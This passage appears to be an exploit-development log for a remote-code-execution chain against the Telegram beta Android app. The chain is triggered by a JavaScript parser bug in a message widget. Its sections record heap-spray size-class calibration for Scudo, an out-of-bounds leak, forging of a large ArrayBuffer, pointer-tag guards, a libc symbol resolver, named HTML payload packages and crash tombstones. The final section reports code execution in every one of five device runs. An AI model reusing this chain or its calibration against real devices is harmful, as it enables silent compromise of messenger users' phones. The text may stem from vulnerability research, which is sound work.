app alive. The controlled 1,800×881 run died at
`add_closure_variables` (`libtmessages.49.so+0x174d9ac`, the
`vd->scope_level` load), and the tombstones show the target address
`b->vardefs + 1,310,700` is in a Scudo `---` (PROT_NONE) reservation, not in
the spray. Both the all-4 and RT/RJ patterns fault at the same instruction
because the fault is the address, not the record content.

**Class correction.** AOSP android13-release `AndroidSizeClassMap`:
`…0x320, 0x450, 0x670, 0x830…`. b's 889-byte request and AB(881)/AB(1,096)/
AB(1,104) are all class **0x450 = 1,104 B** (tag-compatible); AB(1,980) is
class **0x830 = 2,096 B**, a different region. The old 1,980-B/1,988
calibration is not applicable to this target; do not run the 1,980 variant.

**Target geometry.** From the probe tombstone:
b = `0x6e0effae78`, vardefs = `0x6e0effb0d8`, target =
`0x6e0f13b0c4` = `b + 1,311,308`. With C=1,104 and b mod C = 472, the target
is **1,188 chunks + 228 B** after b's chunk; the 881-byte data covers the
228-byte phase. The committed 0x450 region ends at `0x6e0f098000`; the target
is 667 KiB past it (PROT_NONE at 1,800×881).

**Fit of the two device points** (`device/scudo_model.py --fit`): the class
free list has **F ≈ 2,700** pre-existing 0x450 chunks. At 3,200×881,
`F + 475 = 3,175` maps the target page but `F + 581 = 3,281` (LIFO) /
`F + 605 = 3,305` (FIFO) is needed to pop the target chunk, so 3,200 misses
by 81-105 chunks. The fit reproduces 1,800 → PROT_NONE and 3,200 → mapped
NOCORR exactly.

**Next probe.** `device/widget/canary_n1c_probe_3400_72889.html` (7,815 raw /
1,062 zlib9): N1 `A_univ881big` order/sizes (keep=3,000, PB/UV, 3,400×881,
D=3,000, T=600) + paired class-64 canary C (1,200; free evens). Probe/final/
debug share A=2,322, B=4,957, C=408. A canary hit is a positive containment
signal (F=2, second OOB entry on the live odd canary); the all-4 probe cannot
see it (F=1 lands on the header). The candidate final is
`canary_n1c_final_3400_72889.html` (7,815 / 3,215) with the patched
multi-candidate pivot endgame; host twin 3/3 `HF OK` + 162-B proof.

Memory: 3,200 is device-proven; 3,600+C OOMs in the 3.1 MiB-bundle host
model; 3,400 is the smallest margin-safe spray. If 3,400 still misses, use
3,600/3,800 with D dropped, or the drain-keep-tail variant. The analysis and
the model are in `device/SCUDO_CONTAINMENT_ANALYSIS.md` and
`device/scudo_model.py`.

---

## 17. Local-var / class-shift measurement and the cpool-4096 winner

Device/memory context: the generic Android Scudo map (matching the Frida
889/1988 usables) is `…896, 1024, 1280, 1792, 2048, 2560, 3072, 4096…`.
The 881/889 b and the 3,200×881 spray are class 896; the 1,980 filler is
class 2048. The class-896 ceiling is 3,200-3,600 chunks (F≈2,550, cover
≈3,265): 3,200 misses, 3,600 OOMs, two-wave NOCORR.

**argc ladder (dead).** `tmp/argc{32,64,128}.js` (named params + `[] =
eval("[]")`) give `argc=33/65/129`, `ACV scope_idx=31/63/127`; no 65534
leak, no `ACV BSIZE/OOB`. Extra parameters populate the arg scope. Even two
empty patterns kill it (`fsize=335`).

**Local-var ladder (leak survives, loot lost).** `function f([] =
eval("[]")) { var q1..qN; }`, A_ab 1,000×1,980 spray:

| N | fsize | varc | count | generic class | target | leak |
|---:|---:|---:|---:|---:|---|---|
| 0 | 813 | 3 | 4 | 896 | +1,310,700 | 65534 |
| 8 | 996 | 11 | 12 | 1024 | +1,310,700 | 65534 |
| 16 | 1180 | 19 | 20 | 1280 | +1,310,700 | 65534 |
| 32 | 1548 | 35 | 36 | 1792 | +1,310,700 | 65534 |
| 64 | 2284 | 67 | 68 | 2560 | +1,310,700 | 65534 |
| 128 | 3756 | 131 | 132 | 4096 | +1,310,700 | 65534 |

The target byte offset is constant; the class grows; the chunk delta shrinks
1,463→320. But the closure count = 1+varc grows 4→132, so the 7-entry
(56-B, class-64) closure array and the T[599] 327,744-B victim are lost.
This ladder is containment-only.

**cpool shift (winner).** Keep the single `[] = eval("[]")` parameter and
inflate b with 180 float literals: `FSIZE argc=1 varc=6 cvc=0 cpool=180
bc=583 fsize=3731` → class **4096**, `scope_idx=65534`, `ACV BSIZE 3744`,
closure count 7. Target delta `(3008+1,310,700)/4096 = 320.7` chunks,
phase 2,988. Spray 700×AB(4096)=2.87 MB, class-matched/tag-matched, within
the 8 MB baseline.

| test | result |
|---|---|
| stage A `run_plain -l 8` | **5/5** `RESULT ABLEN[599]=327744 VLEN=327744` |
| full chain + patched endG3_host | **5/5** `HF OK` + 162-B proof |
| all-4 safe probe | **5/5** `SAFE4096` |
| widgets | `c4096_{probe,final,debug}_72889.html` 7,996 raw; 979 / 3,183 / 3,184 zlib9; host twins 7,980 / 3,176 |
| A/B/C | A=2,503, B=4,957, C=408 (probe A padded to 2,503) |

The blind path holds `c4096_probe_72889.html`; the device order is probe
(`PRB M=SAFE4096 A=-1`) → final (`ABLEN[599]=327744`, `HF OK`, n1). If the
4096 probe faults, fall back to class 2560 (cpool ≈130 floats, AB(2560)
≈1,100 chunks). The analysis is in `device/LOCALVAR_CLASS_ANALYSIS.md`; the
N1 coordination note is `n1_hookfree/universal/NOTE_parser_cpool4096.md`.

---

## 18. c4096 crash root cause and corrected AB(4080)/AB(2544) packages

The class-4096 probe crashed on the Sony: `SIGSEGV` `SEGV_ACCERR` at
`libtmessages.49.so+0x174d9ac` (`vd->scope_level`), fault
`0x6e5e981dc8`, `x10=65534`, `x11=65535`, `x12=0x6e5e841dd8` (vd_base),
`x13=0x6e5e981dc4` (target = +1,310,700). The faulting map is
`---> 0x6e5e85f000-0x6e6e61dfff ---` (PROT_NONE); both pointers carry tag
`0xb4`, so it is **not** an MTE tag fault; the target page is uncommitted.

Root cause (N1 `REPORT_scudo_classmap.md`): `ArrayBuffer(len)` data is
allocated as `js_calloc(opaque,1,8+len)`; Scudo maps **8+len**. AB(4096)
→ 4104 → class 4352, a different tag than b (class 4096), so the spray
filled the 4352 region and the class-4096 target page stayed PROT_NONE.

Fix (the reliable rule is `class_of(8+len) == class_of(8+sizeof_b)`, checked
with the diag's `ACV BSIZE`):

| class | cpool | b fsize/BSIZE | AB len | request 8+len | spray |
|---:|---:|---:|---:|---:|---:|
| 4096 | 180 floats | 3731 / 3744 | **4080** | 4088 → 4096 | 700 |
| 2560 | 110 floats | 2401 / 2416 | **2544** | 2552 → 2560 | 1100 |

The 2560 b must use cpool 110 (130 floats → 2781/2784 → class 2816, not
2560). Both keep the single parameter, leak 65534, count=7, T[599] loot.

| package | final/debug | safe probe |
|---|---|---|
| `c4096_*_4096c_72889.html` | 5/5 `ABLEN[599]=327744` + `HF OK` + proof | 5/5 `SAFE4096C` |
| `c2560_*_2560c_72889.html` | 5/5 `ABLEN[599]=327744` + `HF OK` + proof | 5/5 `SAFE2560C` |

Sizes: c4096 final 7,996 raw / 3,184 zlib9; probe 7,996 / 970. c2560 final
7,721 / 3,185; probe 7,721 / 964. A/B/C: c4096 A=2,503, c2560 A=2,228,
B=4,957, C=408.

Device order: corrected c4096 probe (`SAFE4096C`) → c4096 final
(`ABLEN[599]=327744`, `HF OK`, n1); if the 4096 probe faults → c2560 probe
(`SAFE2560C`) → c2560 final. If both fail, 3072 (cpool ~145, AB(3056),
delta 427), then 2048 (delta 640); if all classes PROT_NONE, the class
ladder is exhausted and the allocation order/region mapping must change.
No Frida, no chain_off, no per-device values.

---

## 19. Device milestone: c2560 stage A forged: endgame state channel

Device: the corrected c4096 probe AB(4080) and c2560 probe AB(2544) both
pass; the c2560 debug twin stage C shows
`S1 ABLEN[599]=327744 VLEN=327744 ABLEN=327744 VLEN=327744`; the
cpool-110/AB(2544) class-2560 stage A **forges the 327,744-byte AB on the
Sony**, no Frida. The c2560 final stays alive but writes no proof: the
endgame fails silently. The c4096 final crashes at `0x17239d8`, a
Uint8Array element read (`[x1+0x40]` length, `[x1+0x38]` data pointer,
`ldrb [x9,w2]`); x9=0x6c380314d0, w2=0x118, the page is a 4 KB PROT_NONE
guard; a false endgame window/candidate, not the stage-A forge.

**Endgame state channel.** `device/endG3.js` and `device/endG2.js` replace
the terminal `throw new Error("HF "+S)` with
`globalThis.MEGA="HF "+S`; the minified device/host endgames are padded back
to the proven lengths (4,957/4,941) so the c2560 stage-A text/heap is
unchanged. The debug stage C prints `S1 <mark> END=<MEGA>`; the final stage
C is the same-length no-op; the proof is written at teardown.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_2560d_72889.html` | 7,721 | 3,163 |
| `c2560_final_2560d_72889.html` | 7,721 | 3,163 |
| `c4096_debug_4096d_72889.html` | 7,996 | 3,163 |
| `c4096_final_4096d_72889.html` | 7,996 | 3,163 |

Host: c2560d final 5/5 proof 162, debug 5/5 `END=HF OK`; c4096d final 5/5
proof 162, debug 5/5 `END=HF OK`; safe probes survive (`SAFE2560C`/
`SAFE4096C`, END=-). The endG2 direct-scan variant, rebuilt at the same
lengths, crashes 5/5 under the host widget heap and is not usable; the
endG3+MEGA is the host-proven endgame.

Next device run: **c2560 debug** (`c2560_debug_2560d_72889.html`); expected
`S1 ABLEN[599]=327744 VLEN=327744 END=HF ERR <code>` (or `END=HF OK`). The
code localises the anchor: `NOOBJ` class-20, `NOCTOR/NOREALM/NORT`
proto/ctor/realm/rt, `NOFREE/NOANCHOR/BADPIE/NOGOT/NOELF/NOSYS` the
libc/ELF/GOT anchor. If the debug crashes, the false endgame window (the
c4096 `0x17239d8` class) is the issue; guard/order the candidates before the
next final. The proof path is unchanged:
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 20. NOBASE fix: forged pivot, non-fatal slab, SLABV debug

Device c2560d debug: `S1 ABLEN[599]=327744 VLEN=327744 END=HF ERR NOBASE`.
Stage A is fine; the endgame's class-64 pivot (a live T AB) gave
`D2` = that AB's data, and the `D2-8` header -> arena -> slab ->
`slabBase` chain was invalid on the app heap (`NOBASE` at `slab+16`).

`device/endG4.js` changes:

1. **Forged pivot first**: search the forged view for the AB struct with
   `byte_length=327744` and a valid data pointer; its `D2` is the V base,
   so the arena/slab chain comes from the live T[599] data block. The old
   live-64 pivot remains as a fallback.
2. **Non-fatal slab**: BADBS/NOSLAB/NOBASE no longer throw; `globalThis.SLABV`
   carries `H=<bidx> D=<sidx> BS=<bs> SLAB=<ptr> SBASE=<ptr>`; the endgame
   continues with the direct forged-view class-20 candidates (`inSlab`
   falls back to pointer validation).
3. Debug C: `S1 <mark> END=<MEGA> SV=<SLABV>`; final C same-length no-op.

The forced direct-only path (slab disabled) crashes the host widget heap
(5/5), so the slab path is retained when it works; the fallback is for
NOBASE only. A `SLABV` at NOBASE will localise the wrong step on the device.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560g_72889.html` | 8,120 | 3,306 |
| `c2560_final_c2560g_72889.html` | 8,120 | 3,306 |
| `c4096_debug_c4096g_72889.html` | 8,395 | 3,308 |
| `c4096_final_c4096g_72889.html` | 8,395 | 3,308 |

Host: c2560g final 5/5 proof 162, debug 5/5 `END=HF OK SV=`; c4096g final
5/5 proof 162, debug 5/5 `END=HF OK SV=`. The B length is 5,356 (device) /
5,340 (host), +399 vs the 4,957 c2560 stage-A-proven build; the host stage A
still forges. If the device stage A marker disappears, compact B back to
4,957.

Next device run: **c2560 debug** (`c2560_debug_c2560g_72889.html`); expected
`S1 ABLEN[599]=327744 VLEN=327744 END=HF OK SV=` or
`END=HF ERR <code> SV=<SLABV>`. The c4096 final PC `0x17239d8` is the
Uint8Array element read of a false endgame window (data pointer
0x6c380314d0, index 0x118, 4 KB PROT_NONE guard); the forged pivot/guard
changes target that class of failure too.

Proof path: `/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 21. Safe endgame revert: endG5 (NOBASE values, tag-domain window guard)

Device c2560g debug: SIGSEGV at `0x17239d8`, `x9=0xf95b00000001c000`
(tag 0xf9), a false Uint8Array window from the endG4 forged-pivot/direct
path. The c2560g safe probe passed (`S1 SAFE2560C END=- SV=-`), confirming
the +399 B stage A is fine; the crash is endgame-only. The c2560d endG3
NOBASE path was safe but gave no slab values.

`device/endG5.js` is the safe revert:

1. **Original class-64 T-AB pivot** (the endG3 behaviour); no forged-pivot or
   direct-only path.
2. **Non-fatal slab**: BADBS/NOSLAB/NOBASE set `globalThis.SLABV` and
   `globalThis.MEGA` and return; NOBASE carries
   `H=<bidx> D=<sidx> BS=<bs> SLAB=<ptr> SBASE=<ptr>`; the endgame stops
   cleanly, no candidate window is touched.
3. **Tag-domain window guard** `hok(x)`: `x`'s tag must equal the pivot `D2`
   tag and the untagged address must be >65,536 and 8-aligned; applied to
   obj/shape/proto/pay/realm/rt and the slab walk. The f9/0 wild pointers
   are rejected before any `Uint8Array` element read.

The debug C prints `S1 <mark> END=<MEGA> SV=<SLABV>`.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560h_72889.html` | 8,120 | 3,310 |
| `c2560_final_c2560h_72889.html` | 8,120 | 3,310 |
| `c2560_probe_c2560h_72889.html` | 8,120 | 991 |
| `c4096_debug_c4096h_72889.html` | 8,395 | 3,311 |
| `c4096_final_c4096h_72889.html` | 8,395 | 3,311 |

A/B/C: c2560 A=2,228, c4096 A=2,503, **B=5,356 device / 5,340 host**: the
exact c2560g safe-probe length that passed on the Sony; only the endgame
content changed. Host: final 5/5 proof 162, debug 5/5 `END=HF OK SV=`,
probes 5/5 survive.

Next device run: **c2560 debug** (`c2560_debug_c2560h_72889.html`); expected
`S1 ABLEN[599]=327744 VLEN=327744 END=HF OK SV=` or
`END=HF ERR NOBASE SV=NOBASE H=.. D=.. BS=.. SLAB=.. SBASE=..`, app alive.
Then `c2560_final_c2560h_72889.html`; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 22. NOANCHOR diagnostics (endG6d): NC/G/GS/X/O + backward scan

Device c2560h debug: `END=HF ERR NOANCHOR SV=` (app alive); the slab path
completed (`SV=`), the class-20 anchor chain failed. endG6d keeps the endG5
pivot/slab/CAND/`hok` and adds:

* `NC` = class-20 candidates in the forged view, forward + backward;
  `G` = CAND length, `GS` = slab count;
* `X`/`XG` = first V / first CAND failure step: 0 hok, 1 shape, 2 proto,
  3 prop, 4 pay, 5 ctor, 6 code, 7 realm, 8 rt/LIM, 9 pie;
* `O` = first three V offsets;
* backward scan `use(D2-0x8000, 0x8000+327744)` to include the T[599] struct
  below the data base; debug returns `HF READY ...` / `HF ERR NOANCHOR ...`
  with the fields (no ELF).

Host: c2560j debug `END=HF READY NC=0 G=4096 GS=24 X=-1 XG=-1
O=-1,-1,-1 SV=`; c4096j `NC=0 G=4096 GS=22`. The CAND path finds the anchor
on the host; the forged-view scan finds no class-20 struct (the T[599]
struct is outside the positive window). The device's `XG` step will localise
the app-heap failure.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560j_72889.html` | 8,120 | 2,806 |
| `c2560_final_c2560j_72889.html` (endG5 full) | 8,120 | 3,310 |
| `c4096_debug_c4096j_72889.html` | 8,395 | 2,806 |
| `c4096_final_c4096j_72889.html` | 8,395 | 3,311 |

A/B/C unchanged (c2560 A=2,228, c4096 A=2,503, B=5,356/5,340, C=408). Host
final 5/5 proof 162, probes survive. The Twidget intel confirms the minimal
trigger `b` is 266 B/4 KB arena/64 KB slab (881-B spray cannot reach; the
>512-B cpool classes are the right approach); the OOM-kill name-getter bypass
is a policy bug and is not used; the RegExp-delete path is an n-day and is
not used.

Next device run: **c2560j debug** (`c2560_debug_c2560j_72889.html`); expected
`END=HF READY NC=.. G=.. GS=.. X=.. XG=.. O=..` or
`END=HF ERR NOANCHOR ...` with the failing step. Then the anchor fix and the
final; proof `/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 23. Safe NOANCHOR fields (endG6k) after the backward-scan crash

c2560j (endG6d) crashed with SIGSEGV SEGV_MAPERR, fault `0x51000000020000`:
the backward `use(D2-0x8000, 0x8000+327744)` re-pointed the forged AB at
unmapped memory. endG5 (c2560h, no backward scan) was safe with
`END=HF ERR NOANCHOR SV=`.

`device/endG6k.js` removes the backward scan and keeps only validated
reads: the forward forged view, the slab/CAND path, and the `hok` tag guard.
It reports safe fields:
`NC` (forward view class-20 count), `G` (CAND length), `GS` (slab count),
`X`/`XG` (first V / first CAND failure step; 0 hok, 1 shape, 2 proto,
3 prop, 4 pay, 5 C_FUNCTION, 6 code, 7 realm, 8 rt/LIM, 9 pie), `O` (first
three V offsets). `HF READY`/`HF ERR NOANCHOR` + fields; no ELF; app alive.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560k_72889.html` | 8,120 | 2,706 |
| `c2560_final_c2560k_72889.html` (endG5 full) | 8,120 | 3,310 |
| `c4096_debug_c4096k_72889.html` | 8,395 | 2,707 |
| `c4096_final_c4096k_72889.html` | 8,395 | 3,311 |

A/B/C unchanged (c2560 A=2,228, c4096 A=2,503, B=5,356/5,340, C=408).
Host: c2560k debug `READY NC=0 G=4096 GS=24 X=-1 XG=-1 O=-1,-1,-1 SV=`;
c4096k `GS=22`; final 5/5 proof 162; probes survive. The CAND path finds
the anchor on the host; the device `XG` step will localise the failing
shape/proto/prop/C_FUNCTION/realm/rt/LIM link.

Next device run: **c2560k debug** (`c2560_debug_c2560k_72889.html`); expected
`END=HF READY/ERR NOANCHOR NC=.. G=.. GS=.. X=.. XG=.. O=..`, app alive.
Then the anchor fix and final; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 24. Counts-only anchor diagnostic (endG7l): candidates exist

c2560k (endG6k) crashed SEGV_MAPERR `0x15e2000000020000` in the `probeCtor`
`focus` on a candidate field; the endG5 slab/CAND scan was safe. endG7l
removes the `probeCtor` entirely: only the endG5 pivot/slab/CAND scan plus
the counts `NC` (forward view class-20), `G` (CAND), `GS` (slabs),
`C` (first three CAND offsets from D2), `O` (first three V offsets). It
returns `HF ERR NOANCHOR ...`; the app stays alive.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560l_72889.html` | 8,120 | 2,299 |
| `c2560_final_c2560l_72889.html` (endG5 full) | 8,120 | 3,310 |
| `c4096_debug_c4096l_72889.html` | 8,395 | 2,301 |
| `c4096_final_c4096l_72889.html` | 8,395 | 3,311 |

Host counts: c2560l `NC=1273 G=4096 GS=24 C=-64896,-64784,-64672
O=2440,2552,2664`; c4096l `NC=1193 G=4096 GS=22 C=3088,3200,3312
O=2440,2552,2664`. The class-20 candidates exist both in the forged view
and in CAND; the device failure was the dereference, not the scan. A/B/C:
2,228/2,503, 5,356/5,340, 408. Final 5/5 proof 162; probes survive.

Next device run: **c2560l debug**: expected `END=HF ERR NOANCHOR NC=.. G=..
GS=.. C=.. O=.. SV=`, app alive. Then add the mapped/slab-membership guard
before any `focus` (CAND/V objects and shape/proto/pay in `inSlab`/known
ranges; realm/rt only in validated ranges) and retry the anchor. Proof
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 25. Safe stage-C V count (c2560m) and NOBASE value analysis

c2560l (endG7l) was safe but stopped at NOBASE before the counts:
`H=21 D=7 BS=72 SLAB=12970367395759182000 SBASE=12970367397101263000`.
endG5 (c2560h) had slab success (`SV=`). c2560m keeps the **c2560h endG5 B
unchanged** (slab-success path) and adds a safe stage-C count of class-20 in
the 327744-byte `V` (no endgame focus/re-point): `VNC` and the first `VO`.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560m_72889.html` | 8,120 | 3,349 |
| `c2560_final_c2560m_72889.html` (endG5 full) | 8,120 | 3,349 |
| `c4096_debug_c4096m_72889.html` | 8,395 | 3,350 |
| `c4096_final_c4096m_72889.html` | 8,395 | 3,349 |

Host: c2560m debug `END=HF OK SV= VNC=1274VO=2408`; c4096m `VNC=1193VO=2440`;
final proof 162; probe `VNC=0VO=-1`. A/B/C: 2,228/2,503, 5,356/5,340, 408.

NOBASE values: `SLAB=0xb400006d2e88d0b0`, `SBASE=0xb400006d7e875898`
(tags 0xb400). The true SBASE low 48 is `0x6d7e875898` (`%4096=2200`); the
JS `rd64` double rounds it to `…0x5800` (`%4096=2048`). The `slab+16` field
is not a page-aligned base for that pivot (class-72 T[599] data block,
H=21 D=7 BS=72), and a tagged >2^53 pointer cannot be validated with
`%4096` on a JS double. Correct validation: read the low/high 32 bits
(`rd32`), take the page from the low 32, check the tag/range; and only
`focus` candidates inside validated slab/V ranges.

Next device run: **c2560m debug**: expected `END=HF ERR NOANCHOR SV=
VNC=..VO=..`, app alive. Then the mapped/slab candidate guard and the anchor
retry; proof `/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 26. V-primary anchor path (endG8d)

Device c2560m: `NOBASE H=21 D=7 BS=72 ... VNC=1181 VO=1360`; the V count is
independent of the slab. endG8d makes the **V candidates primary**: VBase
from the forged AB struct (`byte_length=327744`), all candidate fields read
through the V offsets (`o+... < 327744`, `vin` guard; no `focus`/re-point);
the slab/CAND is a fallback. Debug returns `HF READY`/`HF ERR NOANCHOR` with
`VNC VO X XG G GS` (+`SLABV`).

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560n_72889.html` | 8,120 | 2,937 |
| `c2560_final_c2560n_72889.html` (endG5 full) | 8,120 | 3,310 |
| `c4096_debug_c4096n_72889.html` | 8,395 | 2,937 |
| `c4096_final_c4096n_72889.html` | 8,395 | 3,311 |

Host: c2560n debug `END=HF READY VNC=1273 VO=2440 X=1 XG=-1 G=4096
GS=24 SV=`; c4096n `READY VNC=1193 VO=2440 X=1`; final proof 162; probes
survive. The V path resolved the anchor through V-offset reads; the first
candidate's shape was outside V (X=1), a later one succeeded.

Slab/base correction: the c2560m `SLAB/SBASE` are tagged >2^53; `%4096` on
the JS double is unreliable (true low 0x5898, double 0x5800). Validate with
`rd32` low/high, page from the low 32, tag/range; keep the endG5 slab
success as the fallback.

Next device run: **c2560n debug**: expected `END=HF READY VNC=..VO=.. X=..`
or `END=HF ERR NOANCHOR ...`, app alive. Then the V-anchor final + ELF;
proof `/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 27. c2560n V-page fault: safe counts-only c2560o

Tombstone 15: PC `0x17239d8` (Uint8Array element read); x1=0x6c5f0b6e38
(typed array), x9=0x6c5f0b5ae8 (data pointer), w2=0x751a (29978); fault
`0x6c5f0bd002` = x9+w2, page `0x6c5f0bd000` PROT_NONE. The V data pointer
and length are valid, but the V data mapping is not fully committed; `vin`
checked only `[VBase, VBase+327744)` offsets, not the V page/slab `used`
bitmap. The c2560m stage-C V scan was safe because its V pages were mapped.

Safe design: after VBase, read the class-64 block header at VBase-8 -> arena
-> `JSArenaSlab`; use the `used` 16-page bitmap and slab ranges to allow V
reads only in committed pages; if the candidate page is not used, fall back
to the endG5 slab NOANCHOR state. Until that guard is device-proven, the
counts-only c2560o/c4096o (c2560m behaviour: endG5 B + stage-C VNC/VO) is the
safe gate; no V-anchor final until READY.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560o_72889.html` | 8,120 | 3,349 |
| `c2560_final_c2560o_72889.html` (endG5 full) | 8,120 | 3,349 |
| `c4096_debug_c4096o_72889.html` | 8,395 | 3,350 |
| `c4096_final_c4096o_72889.html` | 8,395 | 3,349 |

A/B/C unchanged (2,228/2,503, 5,356/5,340, 408). Next device run:
**c2560o debug**: expected `END=HF ERR NOANCHOR SV= VNC=..VO=..`, app
alive. Then the V page/slab-used guard and the V-anchor retry; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 28. VBase fix and V-page gate (c2560o)

c2560n's crash was a V element read at `x9=0x6c5f0b5ae8 + 0x751a` =
`0x6c5f0bd002`, page `0x6c5f0bd000` PROT_NONE. VBase came from the first
class-20 327744 match (false data pointer). c2560o:

1. VBase from the actual **Uint8Array view object** (class 24; count 327744
   at +64; `u.ptr` at +56), or the VAB/T[599] class-20 struct
   (byte_length 327744; data at +16).
2. Read the class-64 header at `VBase-8` -> arena -> `JSArenaSlab`; require
   the `used` bitmap page for VBase. The V path runs only if committed;
   otherwise the endG5 slab NOANCHOR fallback.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560o_72889.html` | 8,120 | 3,120 |
| `c2560_final_c2560o_72889.html` (endG5 full) | 8,120 | 3,310 |
| `c4096_debug_c4096o_72889.html` | 8,395 | 3,121 |
| `c4096_final_c4096o_72889.html` | 8,395 | 3,311 |

Host: c2560o debug `END=HF READY VNC=1273 VO=2440 X=1 XG=-1 G=4096
GS=24 SV=`; c4096o `VNC=1193`; final proof 162; probes survive. A/B/C:
2,228/2,503, 5,356/5,340, 408.

Next device run: **c2560o debug**: expected `END=HF READY VNC=..VO=.. X=..
VK=.. VPg=..` or safe `NOANCHOR` with `VPOK=..`, app alive. The V-anchor
final only after device READY; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 29. c2560o fault is the stage-C full V scan: page-limited c2560p

Tombstone 16: PC `0x17239d8` (Uint8Array element read), x1=`0x6c39771e38`
(typed array), x9=`0x6c39770ae8` (data pointer), x2=`0x3751a` (226,586);
fault `0x6c397a8002` = x9+x2, page `0x6c397a8000` PROT_NONE. c2560n
faulted at 29,978 (page 7) and c2560o at 226,586 (page 55): the forged V
mapping is only partly committed and varies per run. c2560m's full scan
was luck. Page 0, which holds the forged AB/class-20 candidates
(VO=1360/2408), was mapped in every run.

c2560p limits the stage-C V count to `V[0,4096)` - the forged AB data
block's own live page - instead of scanning 0..327744. No other V read
runs on the device NOBASE path: B is the unchanged endG5 and returns at
`NOBASE` (tagged/non-page-aligned SBASE) before its full-V anchor scan.
This is the counts-only safe gate; the V anchor is not attempted.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560p_72889.html` | 8,120 | 3,341 |
| `c2560_final_c2560p_72889.html` (endG5 full) | 8,120 | 3,341 |
| `c2560_probe_c2560p_72889.html` | 8,120 | 1,051 |
| `c4096_debug_c4096p_72889.html` | 8,395 | 3,341 |
| `c4096_final_c4096p_72889.html` | 8,395 | 3,340 |
| `c4096_probe_c4096p_72889.html` | 8,395 | 1,054 |

Host: c2560p debug `END=HF OK VNC=15 VO=2408`, final proof 162, probe
`S1 SAFE2560C END=- VNC=0 VO=-1`; c4096p debug `END=HF OK VNC=6 VO=2440`,
probe `S1 SAFE4096C`. A/B/C unchanged: 2,228/2,503, 5,356/5,340, 408.

Next device run: **c2560p debug**: expected `END=HF ERR NOBASE
VNC=<small> VO=<offset>`, app alive. Then the V-anchor retry with the
`VBase-8 -> arena -> JSArenaSlab used` page guard on every V read; final
proof `/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 30. V-anchor q: class-24 VBase, page window, used-bit PG, absolute probe

Device c2560p passed: `END=HF ERR NOBASE VNC=25 VO=1360`, app alive; page 0
holds 25 class-20 candidates, first at 1360.

Host layout measurements changed the V path:
1. the real VBase is the **class-24 Uint8Array view object** (class_id 24 at
   +18, count 327744 at +64, `u.ptr` at +56; host offset V+4232). The
   class-20 +16 fields are not data pointers (host `0x140002`).
2. the block arena is the VBase page base: `VBase-8-bidx*bs-48 ==
   VBase&~0xfff` (bidx 23/bs 72 host). The old 0x200 window did not cover
   the arena, so the old used-page guard read zeros and never validated.
3. slab/base must be read with `rd32` low/high and the tag stripped (`a48`);
   V pointers must use `p48`; device pointers are tagged >2^53 and
   `g64`/`%` lose the low bits.
4. the anchor probe must be **absolute** (ABX `focus`): the shape/proto/
   realm/rt objects are outside the forged V range (host first candidate
   X=1 in the old V-offset probe; no V-offset candidate resolved).

q implementation:
- class-24 scan V[0,0x7000) (c2560n read pages 0-6; c2560o pages 0-54; the
  scan stops before the c2560n page-7 fault);
- page window = VBase page; arena -> slab -> base/used via a48; used-bit
  self-check; slab list next/prev; PG[81] per V page; every V read gated;
- page-0/used-page class-20 candidates are primary; probeCtor uses
  `hok`+`inUsed` on every deref, shape->proto->prop->C_FUNCTION->realm->rt->
  malloc_limit->pie;
- debug retains the endG5 D2/CAND fallback (exact a48, used-bit
  self-check, inUsed); final retains a minimal D2 used-bit NOBASE check
  (B-size limit) and the ELF/system resolver (linear `.dynsym` scan;
  GNU-hash parser removed for size).

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560q_72889.html` | 8,120 | 3,004 |
| `c2560_final_c2560q_72889.html` | 8,120 | 3,289 |
| `c4096_debug_c4096q_72889.html` | 8,395 | 3,007 |
| `c4096_final_c4096q_72889.html` | 8,395 | 3,291 |
| `c2560_probe_c2560q_72889.html` | 8,120 | 970 |
| `c4096_probe_c4096q_72889.html` | 8,395 | 977 |

A/B/C: 2,228/2,503, 5,356/5,340, 408. Host: c2560q debug `HF READY VNC=1
VO=2440 X=0 XG=0 G=0 GS=48 V=1 VK=1 VG=5`; c4096q `GS=43`; finals proof
162; probes SAFE. Device expected `HF READY VNC=.. VO=1360 ... V=1 VK=1
VG=5` or a precise NOANCHOR/NOBASE (VG step). Final only after device
READY; proof `/data/user/0/org.telegram.messenger.beta/files/n1`.

## 31. Device: c2560q V-anchor READY, parser RCE 5/5 (hook-free)

The c2560q debug was run on the Sony (Android 13, build 72889) with the
message-80345 harness. Result, app alive:

```
S1 ABLEN[599]=327744 VLEN=327744 END=HF READY VNC=1 VO=1360 X=0 XG=0 G=0 GS=115 V=1 VK=1 VG=5
```

`VK=1` (class-24 VBase found), `VG=5` (page-window/used-bit guard OK),
`X=0`/`XG=0` (absolute probe resolved the full chain). Page 0 held the
candidate (VO=1360); GS=115 slabs listed.

The final `c2560_final_c2560q_72889.html` (8,120 raw / 3,289 zlib9) was run
5 times, each with a fresh DB, force-stop, `n1` deletion and message open.
All 5 runs wrote the proof:

```
uid=10346(u0_a346) gid=10346(u0_a346) groups=10346(...) context=u:r:untrusted_app:s0:c90,c257,c512,c768
```

- proof size 185 B, md5 `52258bc776f2f378542d1b2c736840e3` in all 5;
- app alive after the battery (pid 28001);
